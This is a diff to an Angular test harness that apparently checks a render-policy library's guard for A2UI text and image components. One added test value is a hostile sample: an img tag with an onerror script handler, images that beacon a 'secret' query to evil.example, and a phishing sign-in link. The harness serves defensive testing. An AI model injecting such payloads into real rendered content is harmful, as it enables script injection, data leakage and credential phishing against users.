@@ -7,6 +7,7 @@ import '@angular/compiler';
 import { Component, provideZonelessChangeDetection, signal } from '@angular/core';
 import { bootstrapApplication } from '@angular/platform-browser';
 import { RpMarkdownComponent, RpRenderDirective, provideRenderPolicy } from '@render-policy/angular';
+import { RpA2uiImageComponent, RpA2uiTextComponent, provideA2uiGuard } from '@render-policy/angular/a2ui';
 
 declare global {
   interface Window {
@@ -21,6 +22,8 @@ declare global {
       setStreaming(value: boolean): void;
       setDirectiveStream(value: string): void;
       setDirectiveStreaming(value: boolean): void;
+      setA2uiText(value: unknown): void;
+      setA2uiUrl(value: unknown): void;
       tick(): void;
     };
   }
@@ -48,7 +51,7 @@ if (descriptor?.set) {
 @Component({
   selector: 'app-root',
   standalone: true,
-  imports: [RpMarkdownComponent, RpRenderDirective],
+  imports: [RpMarkdownComponent, RpRenderDirective, RpA2uiTextComponent, RpA2uiImageComponent],
   template: `
     <section>
       <h2>Directive</h2>
@@ -62,6 +65,11 @@ if (descriptor?.set) {
       <h2>Directive, streaming</h2>
       <div id="directive-stream" [rpRender]="directiveStreamText()" [rpRenderStreaming]="directiveStreaming()"></div>
     </section>
+    <section>
+      <h2>A2UI Text and Image</h2>
+      <rp-a2ui-text id="a2ui-text" [text]="a2uiText()" />
+      <rp-a2ui-image id="a2ui-image" [url]="a2uiUrl()" description="chart"><span class="blocked">image blocked</span></rp-a2ui-image>
+    </section>
   `,
 })
 class AppComponent {
@@ -72,6 +80,11 @@ class AppComponent {
   readonly streaming = signal(true);
   readonly directiveStreamText = signal('');
   readonly directiveStreaming = signal(true);
+  // Values as an A2UI renderer resolves them from the data model.
+  readonly a2uiText = signal<unknown>(
+    '**Report** <img src="https://evil.example/a2ui-text.png?d=secret" onerror="window.__pwned = true"> ![c](https://evil.example/a2ui-md.png) [sign in](https://evil.example/login)',
+  );
+  readonly a2uiUrl = signal<unknown>('/demo/ok.svg?ng-a2ui=1');
 }
 
 window.__decisions = [];
@@ -79,6 +92,7 @@ const appRef = await bootstrapApplication(AppComponent, {
   providers: [
     provideZonelessChangeDetection(),
     provideRenderPolicy({ mode: 'balanced', onDecision: (decision) => window.__decisions.push(decision) }),
+    provideA2uiGuard({ onDecision: (decision) => window.__decisions.push(decision) }),
   ],
 });
 const app = appRef.components[0]?.instance as AppComponent;
@@ -89,6 +103,8 @@ window.__app = {
   setStreaming: (value) => app.streaming.set(value),
   setDirectiveStream: (value) => app.directiveStreamText.set(value),
   setDirectiveStreaming: (value) => app.directiveStreaming.set(value),
+  setA2uiText: (value) => app.a2uiText.set(value),
+  setA2uiUrl: (value) => app.a2uiUrl.set(value),
   tick: () => appRef.tick(),
 };
 window.__angularReady = true;
